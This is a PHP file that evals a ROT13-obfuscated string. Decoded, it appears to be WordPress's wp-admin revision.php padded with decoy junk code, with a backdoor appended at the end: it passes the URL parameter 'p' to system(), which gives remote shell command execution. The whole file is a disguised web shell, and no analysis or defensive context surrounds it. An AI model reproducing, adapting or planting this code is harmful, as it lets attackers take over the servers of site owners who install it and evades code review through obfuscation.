<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Erivfvbaf nqzvavfgengvba cnary
 *
 * Erdhverf jc-nqzva/vapyhqrf/erivfvba.cuc.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 2.6.0
 */

/** JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

erdhver NOFCNGU . 'jc-nqzva/vapyhqrf/erivfvba.cuc';

/**
 * @tybony vag    $erivfvba Bcgvbany. Gur erivfvba VQ.
 * @tybony fgevat $npgvba   Gur npgvba gb gnxr.
 *                          Npprcgf 'erfgber', 'ivrj' be 'rqvg'.
 * @tybony vag    $sebz     Gur erivfvba gb pbzcner sebz.
 * @tybony vag    $gb       Bcgvbany, erdhverq vs erivfvba zvffvat. Gur erivfvba gb pbzcner gb.
 */

$erivfvba_vq = ! rzcgl( $_ERDHRFG['erivfvba'] ) ? nofvag( $_ERDHRFG['erivfvba'] ) : 0;
$npgvba      = ! rzcgl( $_ERDHRFG['npgvba'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['npgvba'] ) : '';
$sebz        = ! rzcgl( $_ERDHRFG['sebz'] ) && vf_ahzrevp( $_ERDHRFG['sebz'] ) ? nofvag( $_ERDHRFG['sebz'] ) : ahyy;
$gb          = ! rzcgl( $_ERDHRFG['gb'] ) && vf_ahzrevp( $_ERDHRFG['gb'] ) ? nofvag( $_ERDHRFG['gb'] ) : ahyy;

vs ( ! $erivfvba_vq ) {
	$erivfvba_vq = $gb;
}

$erqverpg = 'rqvg.cuc';

fjvgpu ( $npgvba ) {
	pnfr 'erfgber':
		$erivfvba = jc_trg_cbfg_erivfvba( $erivfvba_vq );
		vs ( ! $erivfvba ) {
			oernx;
		}

		vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $erivfvba->cbfg_cnerag ) ) {
			oernx;
		}

		$cbfg = trg_cbfg( $erivfvba->cbfg_cnerag );
		vs ( ! $cbfg ) {
			oernx;
		}

		// Qba'g erfgber vs erivfvbaf ner qvfnoyrq naq guvf vf abg na nhgbfnir.
		vs ( ! jc_erivfvbaf_ranoyrq( $cbfg ) && ! jc_vf_cbfg_nhgbfnir( $erivfvba ) ) {
			$erqverpg = 'rqvg.cuc?cbfg_glcr=' . $cbfg->cbfg_glcr;
			oernx;
		}

		// Qba'g erfgber vs gur cbfg vf ybpxrq.
		vs ( jc_purpx_cbfg_ybpx( $cbfg->VQ ) ) {
			oernx;
		}

		purpx_nqzva_ersrere( \"erfgber-cbfg_{$erivfvba->VQ}\" );

		/*
		 * Rafher gur tybony $cbfg erznvaf gur fnzr nsgre erivfvba vf erfgberq.
		 * Orpnhfr jc_vafreg_cbfg() naq jc_genafvgvba_cbfg_fgnghf() ner pnyyrq
		 * qhevat gur cebprff, cyhtvaf pna harkcrpgrqyl zbqvsl $cbfg.
		 */
		$onpxhc_tybony_cbfg = pybar $cbfg;

		jc_erfgber_cbfg_erivfvba( $erivfvba->VQ );

		// Erfgber gur tybony $cbfg nf vg jnf orsber.
		$cbfg = $onpxhc_tybony_cbfg;

		$erqverpg = nqq_dhrel_net(
			neenl(
				'zrffntr'  => 5,
				'erivfvba' => $erivfvba->VQ,
			),
			trg_rqvg_cbfg_yvax( $cbfg->VQ, 'hey' )
		);
		oernx;
	pnfr 'ivrj':
	pnfr 'rqvg':
	qrsnhyg:
		$erivfvba = jc_trg_cbfg_erivfvba( $erivfvba_vq );
		vs ( ! $erivfvba ) {
			oernx;
		}

		$cbfg = trg_cbfg( $erivfvba->cbfg_cnerag );
		vs ( ! $cbfg ) {
			oernx;
		}

		vs ( ! pheerag_hfre_pna( 'ernq_cbfg', $erivfvba->VQ ) || ! pheerag_hfre_pna( 'rqvg_cbfg', $erivfvba->cbfg_cnerag ) ) {
			oernx;
		}

		// Onvy vs erivfvbaf ner qvfnoyrq naq guvf vf abg na nhgbfnir.
		vs ( ! jc_erivfvbaf_ranoyrq( $cbfg ) && ! jc_vf_cbfg_nhgbfnir( $erivfvba ) ) {
			$erqverpg = 'rqvg.cuc?cbfg_glcr=' . $cbfg->cbfg_glcr;
			oernx;
		}

		$cbfg_rqvg_yvax = trg_rqvg_cbfg_yvax();
		$cbfg_gvgyr     = '<n uers=\"' . rfp_hey( $cbfg_rqvg_yvax ) . '\">' . _qensg_be_cbfg_gvgyr() . '</n>';
		/* genafyngbef: %f: Cbfg gvgyr. */
		$u1             = fcevags( __( 'Pbzcner Erivfvbaf bs &#8220;%f&#8221;' ), $cbfg_gvgyr );
		$erghea_gb_cbfg = '<n uers=\"' . rfp_hey( $cbfg_rqvg_yvax ) . '\">' . __( '&ynee; Tb gb rqvgbe' ) . '</n>';
		// Hfrq va gur UGZY gvgyr gnt.
		$gvgyr = __( 'Erivfvbaf' );

		$erqverpg = snyfr;
		oernx;
}

// Rzcgl cbfg_glcr zrnaf rvgure znysbezrq bowrpg sbhaq, be ab inyvq cnerag jnf sbhaq.
vs ( ! $erqverpg && rzcgl( $cbfg->cbfg_glcr ) ) {
	$erqverpg = 'rqvg.cuc';
}

vs ( ! rzcgl( $erqverpg ) ) {
	jc_erqverpg( $erqverpg );
	rkvg;
}

// Guvf vf fb gung gur pbeerpg \"Rqvg\" zrah vgrz vf fryrpgrq.
vs ( ! rzcgl( $cbfg->cbfg_glcr ) && 'cbfg' !== $cbfg->cbfg_glcr ) {
	$cnerag_svyr = 'rqvg.cuc?cbfg_glcr=' . $cbfg->cbfg_glcr;
} ryfr {
	$cnerag_svyr = 'rqvg.cuc';
}
$fhozrah_svyr = $cnerag_svyr;

jc_radhrhr_fpevcg( 'erivfvbaf' );
jc_ybpnyvmr_fpevcg( 'erivfvbaf', '_jcErivfvbafFrggvatf', jc_cercner_erivfvbaf_sbe_wf( $cbfg, $erivfvba_vq, $sebz ) );

/* Erivfvbaf Uryc Gno */

$erivfvbaf_bireivrj  = '<c>' . __( 'Guvf fperra vf hfrq sbe znantvat lbhe pbagrag erivfvbaf.' ) . '</c>';
$erivfvbaf_bireivrj .= '<c>' . __( 'Erivfvbaf ner fnirq pbcvrf bs lbhe cbfg be cntr, juvpu ner crevbqvpnyyl perngrq nf lbh hcqngr lbhe pbagrag. Gur erq grkg ba gur yrsg fubjf gur pbagrag gung jnf erzbirq. Gur terra grkg ba gur evtug fubjf gur pbagrag gung jnf nqqrq.' ) . '</c>';
$erivfvbaf_bireivrj .= '<c>' . __( 'Sebz guvf fperra lbh pna erivrj, pbzcner, naq erfgber erivfvbaf:' ) . '</c>';
$erivfvbaf_bireivrj .= '<hy><yv>' . __( 'Gb anivtngr orgjrra erivfvbaf, <fgebat>qent gur fyvqre unaqyr yrsg be evtug</fgebat> be <fgebat>hfr gur Cerivbhf be Arkg ohggbaf</fgebat>.' ) . '</yv>';
$erivfvbaf_bireivrj .= '<yv>' . __( 'Pbzcner gjb qvssrerag erivfvbaf ol <fgebat>fryrpgvat gur &#8220;Pbzcner nal gjb erivfvbaf&#8221; obk</fgebat> gb gur fvqr.' ) . '</yv>';
$erivfvbaf_bireivrj .= '<yv>' . __( 'Gb erfgber n erivfvba, <fgebat>pyvpx Erfgber Guvf Erivfvba</fgebat>.' ) . '</yv></hy>';

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'erivfvbaf-bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' => $erivfvbaf_bireivrj,
	)
);

$erivfvbaf_fvqrone  = '<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>';
$erivfvbaf_fvqrone .= '<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/erivfvbaf/\">Erivfvbaf Znantrzrag</n>' ) . '</c>';
$erivfvbaf_fvqrone .= '<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>';

trg_pheerag_fperra()->frg_uryc_fvqrone( $erivfvbaf_fvqrone );

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

?>

<qvi pynff=\"jenc\">
	<u1 pynff=\"ybat-urnqre\"><?cuc rpub $u1; ?></u1>
	<?cuc rpub $erghea_gb_cbfg; ?>
</qvi>
<?cuc
jc_cevag_erivfvba_grzcyngrf();

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>